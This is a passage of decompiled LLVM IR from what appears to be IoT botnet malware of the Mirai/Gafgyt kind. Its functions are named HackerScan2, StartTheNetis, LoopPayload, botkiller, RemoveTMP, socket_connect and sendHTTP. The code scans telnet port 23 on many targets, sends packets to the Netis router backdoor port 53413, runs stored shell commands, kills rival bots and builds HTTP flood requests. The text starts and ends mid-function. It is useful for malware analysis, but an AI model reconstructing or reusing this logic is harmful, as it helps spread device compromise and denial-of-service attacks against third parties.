  %v1_10007ee8 = add i32 %v1_10007ed8, -27993
  %v1_10007eec = and i32 %v1_10007ee8, -16
  store i32 %v1_10007eec, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007f1c.264 to i32), i32* @lr, align 4
  %v3_10007f18 = call i32 @__GI_memset(i32 %v1_10007eec, i32 0, i32 5000)
  store i32 1000, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007f28

dec_label_pc_10007f28:                            ; preds = %entry, %dec_label_pc_10007f28
  %storemerge37 = phi i32 [ 0, %entry ], [ %v1_10007fa8, %dec_label_pc_10007f28 ]
  %v1_10007f30 = mul nuw nsw i32 %storemerge37, 28
  %v2_10007f34 = add i32 %v1_10007f30, %v1_10007eec
  store i32 %v2_10007f34, i32* %r9.global-to-local, align 4
  %v2_10007f3c = inttoptr i32 %v2_10007f34 to i32*
  store i32 0, i32* %v2_10007f3c, align 4
  %v1_10007f44 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f44 = add i32 %v1_10007f44, 4
  %v3_10007f44 = inttoptr i32 %v2_10007f44 to i32*
  store i32 0, i32* %v3_10007f44, align 4
  %v1_10007f4c = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f4c = add i32 %v1_10007f4c, 8
  %v3_10007f4c = inttoptr i32 %v2_10007f4c to i32*
  store i32 0, i32* %v3_10007f4c, align 4
  %v1_10007f54 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f54 = add i32 %v1_10007f54, 12
  %v3_10007f54 = inttoptr i32 %v2_10007f54 to i32*
  store i32 0, i32* %v3_10007f54, align 4
  %v1_10007f5c = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f5c = add i32 %v1_10007f5c, 16
  %v3_10007f5c = inttoptr i32 %v2_10007f5c to i32*
  store i32 0, i32* %v3_10007f5c, align 4
  %v1_10007f64 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f64 = add i32 %v1_10007f64, 20
  %v3_10007f64 = inttoptr i32 %v2_10007f64 to i32*
  store i32 0, i32* %v3_10007f64, align 4
  %v1_10007f6c = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f6c = add i32 %v1_10007f6c, 24
  %v3_10007f6c = inttoptr i32 %v2_10007f6c to i32*
  store i32 0, i32* %v3_10007f6c, align 4
  %v3_10007f84 = add i32 %v2_10007f34, 9
  %v4_10007f84 = inttoptr i32 %v3_10007f84 to i8*
  store i8 1, i8* %v4_10007f84, align 1
  %v1_10007f98 = add i32 %v2_10007f34, 24
  %v2_10007fa0 = inttoptr i32 %v1_10007f98 to i32*
  store i32 %v1_10007e94, i32* %v2_10007fa0, align 4
  %v1_10007fa8 = add nuw nsw i32 %storemerge37, 1
  store i32 1000, i32* %r9.global-to-local, align 4
  %v2_10007fb8 = icmp slt i32 %v1_10007fa8, 1000
  br i1 %v2_10007fb8, label %dec_label_pc_10007f28, label %dec_label_pc_10007fc0.preheader

dec_label_pc_10007fc0.preheader:                  ; preds = %dec_label_pc_10007f28
  %v2_10008008 = add i32 %v1_10007eec, 16
  %v2_1000811c = or i32 %v1_10007eec, 4
  %v2_10008324 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10007fc0

dec_label_pc_10007fc0:                            ; preds = %dec_label_pc_10009064, %dec_label_pc_10007fc0.preheader
  br label %dec_label_pc_10007fcc

dec_label_pc_10007fcc:                            ; preds = %dec_label_pc_10007fc0, %dec_label_pc_10009064
  %storemerge45 = phi i32 [ 0, %dec_label_pc_10007fc0 ], [ %v1_10009068, %dec_label_pc_10009064 ]
  %v1_10007fd4 = mul nuw nsw i32 %storemerge45, 28
  %v2_10007fd8 = add i32 %v1_10007fd4, %v1_10007eec
  %v1_10007fdc = add i32 %v2_10007fd8, 16
  store i32 %v1_10007fdc, i32* %r9.global-to-local, align 4
  %v1_10007fe0 = inttoptr i32 %v1_10007fdc to i32*
  %v2_10007fe0 = load i32, i32* %v1_10007fe0, align 4
  %v3_10007fe4 = icmp eq i32 %v2_10007fe0, 0
  br i1 %v3_10007fe4, label %dec_label_pc_10007fec, label %dec_label_pc_10008014

dec_label_pc_10007fec:                            ; preds = %dec_label_pc_10007fcc
  store i32 268468216, i32* @lr, align 4
  %v1_10007ff4 = call i32 @__GI_time(i32 0)
  %v1_10008004 = mul i32 %storemerge45, 28
  %v1_1000800c = add i32 %v2_10008008, %v1_10008004
  store i32 %v1_1000800c, i32* %r9.global-to-local, align 4
  %v2_10008010 = inttoptr i32 %v1_1000800c to i32*
  store i32 %v1_10007ff4, i32* %v2_10008010, align 4
  br label %dec_label_pc_10008014

dec_label_pc_10008014:                            ; preds = %dec_label_pc_10007fcc, %dec_label_pc_10007fec
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v1_10008024 = add i32 %v2_10007fd8, 8
  %v2_10008024 = inttoptr i32 %v1_10008024 to i8*
  %v3_10008024 = load i8, i8* %v2_10008024, align 4
  %v2_10008034 = icmp ugt i8 %v3_10008024, 7
  br i1 %v2_10008034, label %dec_label_pc_10009064, label %dec_label_pc_1000803c

dec_label_pc_1000803c:                            ; preds = %dec_label_pc_10008014
  %v4_10008024 = zext i8 %v3_10008024 to i32
  %v1_10008040 = mul nuw nsw i32 %v4_10008024, 4
  %v2_1000804c = add i32 %v1_10008040, ptrtoint (i32* @global_var_100171c4.265 to i32)
  store i32 %v2_1000804c, i32* %r9.global-to-local, align 4
  %v1_10008050 = inttoptr i32 %v2_1000804c to i32*
  %v2_10008050 = load i32, i32* %v1_10008050, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1000805c = add i32 %v2_10008050, ptrtoint (i32* @global_var_100171c4.265 to i32)
  call void @__pseudo_branch(i32 %v2_1000805c)
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v1_10008078 = add i32 %v2_10007fd8, 9
  %v2_10008078 = inttoptr i32 %v1_10008078 to i8*
  %v3_10008078 = load i8, i8* %v2_10008078, align 1
  %v3_10008080 = icmp eq i8 %v3_10008078, 1
  store i32 %v1_10007eec, i32* %r9.global-to-local, align 4
  br i1 %v3_10008080, label %dec_label_pc_10008088, label %dec_label_pc_1000812c

dec_label_pc_10008088:                            ; preds = %dec_label_pc_1000803c
  %v1_10008098 = add i32 %v2_10007fd8, 24
  store i32 %v1_10008098, i32* %r9.global-to-local, align 4
  %v1_1000809c = inttoptr i32 %v1_10008098 to i32*
  %v2_1000809c = load i32, i32* %v1_1000809c, align 4
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v2_100080b8 = inttoptr i32 %v2_10007fd8 to i32*
  store i32 0, i32* %v2_100080b8, align 4
  %v1_100080c0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080c0 = add i32 %v1_100080c0, 4
  %v3_100080c0 = inttoptr i32 %v2_100080c0 to i32*
  store i32 0, i32* %v3_100080c0, align 4
  %v1_100080c8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080c8 = add i32 %v1_100080c8, 8
  %v3_100080c8 = inttoptr i32 %v2_100080c8 to i32*
  store i32 0, i32* %v3_100080c8, align 4
  %v1_100080d0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080d0 = add i32 %v1_100080d0, 12
  %v3_100080d0 = inttoptr i32 %v2_100080d0 to i32*
  store i32 0, i32* %v3_100080d0, align 4
  %v1_100080d8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080d8 = add i32 %v1_100080d8, 16
  %v3_100080d8 = inttoptr i32 %v2_100080d8 to i32*
  store i32 0, i32* %v3_100080d8, align 4
  %v1_100080e0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080e0 = add i32 %v1_100080e0, 20
  %v3_100080e0 = inttoptr i32 %v2_100080e0 to i32*
  store i32 0, i32* %v3_100080e0, align 4
  %v1_100080e8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080e8 = add i32 %v1_100080e8, 24
  %v3_100080e8 = inttoptr i32 %v2_100080e8 to i32*
  store i32 0, i32* %v3_100080e8, align 4
  store i32 %v1_10008098, i32* %r9.global-to-local, align 4
  store i32 %v2_1000809c, i32* %v1_1000809c, align 4
  %v0_1000810c = call i32 @HackerScan2()
  %v0_10008118 = load i32, i32* @r29, align 4
  %v1_10008118 = mul i32 %v0_10008118, 28
  %v1_10008120 = add i32 %v1_10008118, %v2_1000811c
  store i32 %v1_10008120, i32* %r9.global-to-local, align 4
  %v2_10008124 = inttoptr i32 %v1_10008120 to i32*
  store i32 %v0_1000810c, i32* %v2_10008124, align 4
  br label %dec_label_pc_10008224

dec_label_pc_1000812c:                            ; preds = %dec_label_pc_1000803c
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v3_1000813c = load i8, i8* %v2_10008078, align 1
  %v3_10008144 = icmp eq i8 %v3_1000813c, 0
  br i1 %v3_10008144, label %dec_label_pc_1000814c, label %dec_label_pc_10008224

dec_label_pc_1000814c:                            ; preds = %dec_label_pc_1000812c
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v1_1000815c = add i32 %v2_10007fd8, 11
  %v2_1000815c = inttoptr i32 %v1_1000815c to i8*
  %v3_1000815c = load i8, i8* %v2_1000815c, align 1
  %v1_10008164 = add i8 %v3_1000815c, 1
  store i8 %v1_10008164, i8* %v2_1000815c, align 1
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v1_1000818c = add i32 %v2_10007fd8, 10
  %v2_1000818c = inttoptr i32 %v1_1000818c to i8*
  %v3_1000818c = load i8, i8* %v2_1000818c, align 2
  %v1_10008194 = add i8 %v3_1000818c, 1
  store i8 %v1_10008194, i8* %v2_1000818c, align 2
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v3_100081bc = load i8, i8* %v2_1000815c, align 1
  %v3_100081c4 = icmp eq i8 %v3_100081bc, 22
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  br i1 %v3_100081c4, label %dec_label_pc_100081cc, label %dec_label_pc_100081e8

dec_label_pc_100081cc:                            ; preds = %dec_label_pc_1000814c
  store i8 1, i8* %v2_10008078, align 1
  br label %dec_label_pc_10009064

dec_label_pc_100081e8:                            ; preds = %dec_label_pc_1000814c
  %v3_100081f8 = load i8, i8* %v2_1000818c, align 2
  %v3_10008200 = icmp eq i8 %v3_100081f8, 22
  br i1 %v3_10008200, label %dec_label_pc_10008208, label %dec_label_pc_10008224

dec_label_pc_10008208:                            ; preds = %dec_label_pc_100081e8
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008078, align 1
  br label %dec_label_pc_10009064

dec_label_pc_10008224:                            ; preds = %dec_label_pc_100081e8, %dec_label_pc_1000812c, %dec_label_pc_10008088
  store i32 2, i32* %stack_var_-40, align 4
  store i32 23, i32* @r3, align 4
  %v1_10008230 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-32, align 4
  %v1_10008264 = add i32 %v2_10007fd8, 4
  store i32 %v1_10008264, i32* %r9.global-to-local, align 4
  store i32 268468868, i32* @lr, align 4
  %v3_10008280 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000828c = mul i32 %storemerge45, 28
  %v2_10008290 = add i32 %v1_1000828c, %v1_10007eec
  %v2_10008294 = inttoptr i32 %v2_10008290 to i32*
  store i32 %v3_10008280, i32* %v2_10008294, align 4
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v1_100082a8 = inttoptr i32 %v2_10007fd8 to i32*
  %v2_100082a8 = load i32, i32* %v1_100082a8, align 4
  store i32 %v2_100082a8, i32* %r9.global-to-local, align 4
  %v4_100082b0 = icmp eq i32 %v2_100082a8, -1
  br i1 %v4_100082b0, label %dec_label_pc_10009064, label %dec_label_pc_100082b8

dec_label_pc_100082b8:                            ; preds = %dec_label_pc_10008224
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v2_100082c8 = load i32, i32* %v1_100082a8, align 4
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v2_100082dc = load i32, i32* %v1_100082a8, align 4
  store i32 268468980, i32* @lr, align 4
  %v2_100082f0 = call i32 @__libc_fcntl(i32 %v2_100082dc, i32 3)
  store i32 268469008, i32* @lr, align 4
  %v2_1000830c = call i32 @__libc_fcntl(i32 %v2_100082c8, i32 4)
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v2_10008320 = load i32, i32* %v1_100082a8, align 4
  store i32 %v2_10008324, i32* %r9.global-to-local, align 4
  store i32 268469048, i32* @lr, align 4
  %v3_10008334 = call i32 @__libc_connect(i32 %v2_10008320, i32 %v2_10008324, i32 16)
  store i32 %v3_10008334, i32* %r9.global-to-local, align 4
  %v4_10008340 = icmp eq i32 %v3_10008334, -1
  br i1 %v4_10008340, label %dec_label_pc_10008348, label %dec_label_pc_10008394

dec_label_pc_10008348:                            ; preds = %dec_label_pc_100082b8
  %v0_10008348 = call i32 @__errno_location()
  store i32 %v0_10008348, i32* %r9.global-to-local, align 4
  %v1_10008350 = inttoptr i32 %v0_10008348 to i32*
  %v2_10008350 = load i32, i32* %v1_10008350, align 4
  %v3_10008354 = icmp eq i32 %v2_10008350, 115
  br i1 %v3_10008354, label %dec_label_pc_10008394, label %dec_label_pc_1000835c

dec_label_pc_1000835c:                            ; preds = %dec_label_pc_10008348
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  %v2_1000836c = load i32, i32* %v1_100082a8, align 4
  %v2_10008374 = call i32 @sclose(i32 %v2_1000836c, i32 %v2_10007fd8)
  store i32 %v2_10007fd8, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008078, align 1
  br label %dec_label_pc_10009064

dec_label_pc_10008394:                            ; preds = %dec_label_pc_100082b8, %dec_label_pc_10008348
  store i8 1, i8* %v2_10008024, align 4
  store i32 %v1_10007fdc, i32* %r9.global-to-local, align 4
  store i32 0, i32* %v1_10007fe0, align 4
  br label %dec_label_pc_10009064

dec_label_pc_10009064:                            ; preds = %dec_label_pc_10008224, %dec_label_pc_10008014, %dec_label_pc_10008394, %dec_label_pc_1000835c, %dec_label_pc_10008208, %dec_label_pc_100081cc
  %v1_10009068 = add nuw nsw i32 %storemerge45, 1
  %v2_10009078 = icmp slt i32 %v1_10009068, 1000
  br i1 %v2_10009078, label %dec_label_pc_10007fcc, label %dec_label_pc_10007fc0

; uselistorder directives
  uselistorder i8* %v2_1000818c, { 1, 0, 2 }
  uselistorder i8* %v2_1000815c, { 1, 0, 2 }
  uselistorder i8* %v2_10008078, { 3, 0, 1, 2, 4 }
  uselistorder i8 %v3_10008024, { 1, 0 }
  uselistorder i32 %v2_10007fd8, { 7, 9, 8, 10, 11, 12, 14, 13, 15, 0, 1, 2, 4, 3, 6, 5, 19, 17, 16, 18, 21, 20, 23, 22, 24 }
  uselistorder i32 %storemerge45, { 3, 1, 0, 2 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v1_10007eec, { 0, 4, 1, 3, 5, 2, 6, 7 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 46, 29, 30, 31, 32, 33, 41, 34, 35, 36, 37, 38, 39, 40, 45, 42, 43, 44 }
  uselistorder i32 1000, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10009064, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_10008394, { 1, 0 }
  uselistorder label %dec_label_pc_10008014, { 1, 0 }
  uselistorder label %dec_label_pc_10007fcc, { 1, 0 }
  uselistorder label %dec_label_pc_10007f28, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1044 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v2_10009100 = ptrtoint i32* %stack_var_-1044 to i32
  %v2_10009130 = ptrtoint i32* %stack_var_-1060 to i32
  br label %dec_label_pc_10009098

dec_label_pc_10009098:                            ; preds = %dec_label_pc_10009098, %entry
  store i32 268472488, i32* @lr, align 4
  %v3_100090a4 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268472500, i32* @lr, align 4
  %v0_100090b0 = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-1060, align 4
  store i32 53413, i32* @r3, align 4
  %v1_100090cc = call i32 @htons(i32 53413)
  store i32 %v2_10009100, i32* @r3, align 4
  store i32 268472608, i32* @lr, align 4
  %v6_1000911c = call i32 @sprintf(i32 %v2_10009100, i32 ptrtoint ([711 x i8]* @global_var_100171e4.297 to i32), i32 ptrtoint ([3 x i8]* @global_var_100174ac.298 to i32), i32 268500992)
  store i32 %v2_10009100, i32* @r3, align 4
  %v0_10009128 = call i32 @__GI_strlen()
  store i32 268472660, i32* @lr, align 4
  %v6_10009150 = call i32 @__libc_sendto(i32 %v3_100090a4, i32 %v2_10009100, i32 %v0_10009128, i32 0, i32 %v2_10009130, i32 16)
  br label %dec_label_pc_10009098

; uselistorder directives
  uselistorder i32 %v2_10009100, { 0, 2, 1, 3 }
}

define i32 @LoopPayload(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10009158 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10009158, i32* %stack_var_-32, align 4
  %v5_10009158 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v5_10009158, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1000918c.300 to i32), i32* @lr, align 4
  %v2_10009188 = call i32 @__libc_system(i32 ptrtoint ([704 x i8]* @global_var_100174b4.299 to i32))
  ret i32 %v2_10009188

; uselistorder directives
  uselistorder i32* %stack_var_-32, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-244 = alloca i32, align 4
  %stack_var_-2328 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-1288 = alloca i32, align 4
  %stack_var_-2276 = alloca i32, align 4
  %stack_var_-2316 = alloca i32, align 4
  %v2_100091d4 = ptrtoint i32* %stack_var_-2316 to i32
  store i32 %v2_100091d4, i32* @r3, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_10019128.310 to i32), i32* @r4, align 4
  store i32 40, i32* @r5, align 4
  store i32 268472812, i32* @lr, align 4
  %v0_100091e8 = call i32 @memcpy()
  %v2_100091f4 = ptrtoint i32* %stack_var_-2276 to i32
  store i32 %v2_100091f4, i32* @r3, align 4
  store i32 ptrtoint ([247 x i8*]* @global_var_10018cf4.551 to i32), i32* @r4, align 4
  store i32 988, i32* @r5, align 4
  store i32 268472844, i32* @lr, align 4
  %v0_10009208 = call i32 @memcpy()
  %v2_10009214 = ptrtoint i32* %stack_var_-1288 to i32
  store i32 %v2_10009214, i32* @r3, align 4
  store i32 ptrtoint ([241 x i8*]* @global_var_100180d0.778 to i32), i32* @r4, align 4
  store i32 964, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000922c.779 to i32), i32* @lr, align 4
  %v0_10009228 = call i32 @memcpy()
  store i32 0, i32* %stack_var_-2328, align 4
  %tmp14 = icmp slt i32 %tmp, 1
  br i1 %tmp14, label %dec_label_pc_100093d4, label %dec_label_pc_10009384

dec_label_pc_10009384:                            ; preds = %entry
  %v2_10009244 = ptrtoint i32* %stack_var_-164 to i32
  store i32 268472924, i32* @lr, align 4
  %v3_10009258 = call i32 @__GI_memset(i32 %v2_10009244, i32 0, i32 128)
  %v2_10009270 = ptrtoint i32* %stack_var_-2328 to i32
  %v2_10009274 = add i32 %v2_10009270, 12
  %v1_1000927c = inttoptr i32 %v2_10009274 to i32*
  %v2_1000927c = load i32, i32* %v1_1000927c, align 4
  %v2_100092d4 = add i32 %v2_10009270, 1040
  store i32 %v2_10009244, i32* @r3, align 4
  store i32 127, i32* @r4, align 4
  store i32 ptrtoint ([100 x i8]* @global_var_10019150.780 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10009310.781 to i32), i32* @lr, align 4
  %v8_1000930c = call i32 @__GI_snprintf(i32 %v2_10009244, i32 127, i32 ptrtoint ([100 x i8]* @global_var_10019150.780 to i32), i32 %v2_1000927c, i32 %v2_1000927c, i32 %v2_1000927c, i32 %v2_1000927c)
  store i32 268473232, i32* @lr, align 4
  %v1_1000938c = call i32 @__libc_system(i32 %v2_10009244)
  %v3_10009390 = load i32, i32* %stack_var_-2328, align 4
  %v1_10009394 = mul i32 %v3_10009390, 4
  %v1_100093a0 = add i32 %v1_10009394, %v2_100092d4
  %v1_100093a4 = inttoptr i32 %v1_100093a0 to i32*
  %v2_100093a4 = load i32, i32* %v1_100093a4, align 4
  %v2_100093a8 = ptrtoint i32* %stack_var_-244 to i32
  store i32 %v2_100093a8, i32* @r3, align 4
  store i32 268473284, i32* @lr, align 4
  %v5_100093c0 = call i32 @sprintf(i32 %v2_100093a8, i32 ptrtoint ([14 x i8]* @global_var_100191d4.783 to i32), i32 %v2_100093a4, i32 268566528)
  store i32 ptrtoint (i32* @global_var_100093d0.784 to i32), i32* @lr, align 4
  %v1_100093cc = call i32 @__libc_system(i32 %v2_100093a8)
  br label %dec_label_pc_100093dc

dec_label_pc_100093d4:                            ; preds = %entry
  store i32 268473308, i32* @lr, align 4
  %v1_100093d8 = call i32 @sleep(i32 5)
  br label %dec_label_pc_100093dc

dec_label_pc_100093dc:                            ; preds = %dec_label_pc_10009384, %dec_label_pc_100093d4
  %storemerge1 = phi i32 [ %v1_100093d8, %dec_label_pc_100093d4 ], [ %v1_100093cc, %dec_label_pc_10009384 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_100093a8, { 1, 0, 2 }
  uselistorder i32 %v2_10009244, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-2328, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100093dc, { 1, 0 }
}

define i32 @RemoveTMP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100093fc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100093fc, i32* %stack_var_-16, align 4
  %v5_100093fc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v5_100093fc, i32* @r31, align 4
  store i32 268473372, i32* @lr, align 4
  %v2_10009418 = call i32 @__libc_system(i32 ptrtoint ([43 x i8]* @global_var_100191e4.785 to i32))
  store i32 268473384, i32* @lr, align 4
  %v2_10009424 = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_10019210.786 to i32))
  store i32 268473396, i32* @lr, align 4
  %v2_10009430 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_10019228.787 to i32))
  store i32 268473408, i32* @lr, align 4
  %v2_1000943c = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_10019210.786 to i32))
  store i32 268473420, i32* @lr, align 4
  %v2_10009448 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_10019240.788 to i32))
  store i32 268473432, i32* @lr, align 4
  %v2_10009454 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_10019250.789 to i32))
  store i32 268473444, i32* @lr, align 4
  %v2_10009460 = call i32 @__libc_system(i32 ptrtoint ([23 x i8]* @global_var_1001925c.790 to i32))
  store i32 268473456, i32* @lr, align 4
  %v2_1000946c = call i32 @__libc_system(i32 ptrtoint ([20 x i8]* @global_var_10019274.791 to i32))
  store i32 268473468, i32* @lr, align 4
  %v2_10009478 = call i32 @__libc_system(i32 ptrtoint ([11 x i8]* @global_var_10019288.792 to i32))
  store i32 268473480, i32* @lr, align 4
  %v2_10009484 = call i32 @__libc_system(i32 ptrtoint ([17 x i8]* @global_var_10019294.793 to i32))
  store i32 268473492, i32* @lr, align 4
  %v2_10009490 = call i32 @__libc_system(i32 ptrtoint ([14 x i8]* @global_var_100192a8.794 to i32))
  store i32 268473504, i32* @lr, align 4
  %v2_1000949c = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_100192b8.795 to i32))
  store i32 268473516, i32* @lr, align 4
  %v2_100094a8 = call i32 @__libc_system(i32 ptrtoint ([36 x i8]* @global_var_100192d0.796 to i32))
  ret i32 %v2_100094a8

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268473588, i32* @lr, align 4
  %v1_100094f0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10009500 = icmp eq i32 %v1_100094f0, 0
  br i1 %v3_10009500, label %dec_label_pc_10009508, label %dec_label_pc_10009514

dec_label_pc_10009508:                            ; preds = %entry
  br label %dec_label_pc_100095ec

dec_label_pc_10009514:                            ; preds = %entry
  %v1_10009518 = add i32 %v1_100094f0, 16
  %v2_10009518 = inttoptr i32 %v1_10009518 to i32*
  %v3_10009518 = load i32, i32* %v2_10009518, align 4
  %v1_1000951c = inttoptr i32 %v3_10009518 to i32*
  %v2_1000951c = load i32, i32* %v1_1000951c, align 4
  %v1_10009524 = add i32 %v1_100094f0, 12
  %v2_10009524 = inttoptr i32 %v1_10009524 to i32*
  %v3_10009524 = load i32, i32* %v2_10009524, align 4
  %v2_1000952c = ptrtoint i32* %stack_var_-48 to i32
  %v2_10009530 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_10009524, i32* @r5, align 4
  store i32 268473668, i32* @lr, align 4
  %v4_10009540 = call i32 @bcopy(i32 %v2_1000951c, i32 %v2_10009530, i32 %v3_10009524, i32 %v2_1000952c)
  %v4_10009544 = zext i16 %arg2 to i32
  store i32 %v4_10009544, i32* @r3, align 4
  %v1_10009550 = call i32 @htons(i32 %v4_10009544)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268473716, i32* @lr, align 4
  %v3_10009570 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_1000957c = ptrtoint i32* %stack_var_-32 to i32
  store i32 268473752, i32* @lr, align 4
  %v5_10009594 = call i32 @__GI_setsockopt(i32 %v3_10009570, i32 6, i32 1, i32 %v2_1000957c, i32 4)
  %v4_100095a0 = icmp eq i32 %v3_10009570, -1
  br i1 %v4_100095a0, label %dec_label_pc_100095a8, label %dec_label_pc_100095b4

dec_label_pc_100095a8:                            ; preds = %dec_label_pc_10009514
  br label %dec_label_pc_100095ec

dec_label_pc_100095b4:                            ; preds = %dec_label_pc_10009514
  store i32 268473800, i32* @lr, align 4
  %v3_100095c4 = call i32 @__libc_connect(i32 %v3_10009570, i32 %v2_1000952c, i32 16)
  %v4_100095d0 = icmp eq i32 %v3_100095c4, -1
  br i1 %v4_100095d0, label %dec_label_pc_100095d8, label %dec_label_pc_100095e4

dec_label_pc_100095d8:                            ; preds = %dec_label_pc_100095b4
  br label %dec_label_pc_100095ec

dec_label_pc_100095e4:                            ; preds = %dec_label_pc_100095b4
  br label %dec_label_pc_100095ec

dec_label_pc_100095ec:                            ; preds = %dec_label_pc_100095d8, %dec_label_pc_100095a8, %dec_label_pc_10009508, %dec_label_pc_100095e4
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_10009508 ], [ 0, %dec_label_pc_100095a8 ], [ 0, %dec_label_pc_100095d8 ], [ %v3_10009570, %dec_label_pc_100095e4 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_1000952c, { 1, 0 }
  uselistorder i32 %v3_10009524, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_100095ec, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-568 = alloca i32, align 4
  %stack_var_-840 = alloca i32, align 4
  %stack_var_-828 = alloca i32, align 4
  %v2_10009648 = ptrtoint i32* %stack_var_-828 to i32
  store i32 %v2_10009648, i32* @r3, align 4
  store i32 ptrtoint ([62 x i8*]* @global_var_1001a67c.859 to i32), i32* @r4, align 4
  store i32 248, i32* @r5, align 4
  store i32 268473952, i32* @lr, align 4
  %v0_1000965c = call i32 @memcpy()
  store i32 268473992, i32* @lr, align 4
  %v1_10009684 = call i32 @__GI_time(i32 0)
  %v2_10009690 = add i32 %v1_10009684, %arg5
  store i32 268474012, i32* @lr, align 4
  %v0_10009698 = call i32 @random()
  store i32 268474084, i32* @lr, align 4
  %v0_100096e0 = call i32 @random()
  %v2_1000972c = ptrtoint i32* %stack_var_-568 to i32
  store i32 %v2_1000972c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10009754.867 to i32), i32* @lr, align 4
  %v9_10009750 = call i32 @sprintf(i32 %v2_1000972c, i32 ptrtoint ([62 x i8]* @global_var_1001a774.866 to i32), i32 %arg2, i32 %arg4)
  %v2_100098008 = icmp sgt i32 %arg6, 0
  br i1 %v2_100098008, label %dec_label_pc_10009760.lr.ph, label %dec_label_pc_10009808

dec_label_pc_10009760.lr.ph:                      ; preds = %entry
  br label %dec_label_pc_10009760

dec_label_pc_10009760:                            ; preds = %dec_label_pc_10009760.lr.ph, %dec_label_pc_100097ec
